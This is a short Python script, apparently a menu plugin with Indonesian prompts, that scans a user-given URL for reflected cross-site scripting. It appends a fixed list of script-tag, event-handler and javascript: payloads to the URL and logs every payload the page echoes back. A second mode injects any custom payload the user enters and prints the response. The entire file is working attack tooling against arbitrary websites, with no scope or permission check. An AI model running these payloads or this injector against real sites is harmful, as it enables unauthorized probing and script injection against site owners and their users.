DESCRIPTION = "XSS Scanner & Injector"
def run():
    import requests
    
    print("[1] Scan Reflected XSS")
    print("[2] Custom Payload Inject")
    choice = input("Pilih: ")
    
    payloads = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'><script>alert(1)</script>",
        "javascript:alert(1)",
        "<body onload=alert(1)>"
    ]
    
    if choice == "1":
        target = input("URL target (dengan parameter?q=): ")
        print("[*] Scanning...")
        for payload in payloads:
            try:
                r = requests.get(target + payload, timeout=5)
                if payload in r.text:
                    print(f"[+] VULN: {payload}")
                    with open("xss_vuln.txt", "a") as f:
                        f.write(f"{target} | Payload: {payload}\n")
                else:
                    print(f"[-] Not: {payload[:20]}...")
            except:
                pass
    
    elif choice == "2":
        target = input("URL target: ")
        custom_payload = input("Custom payload: ")
        try:
            r = requests.get(target + custom_payload, timeout=5)
            print(f"[*] Response ({len(r.text)} bytes):")
            print(r.text[:500])
        except Exception as e:
            print(f"[!] Error: {e}")
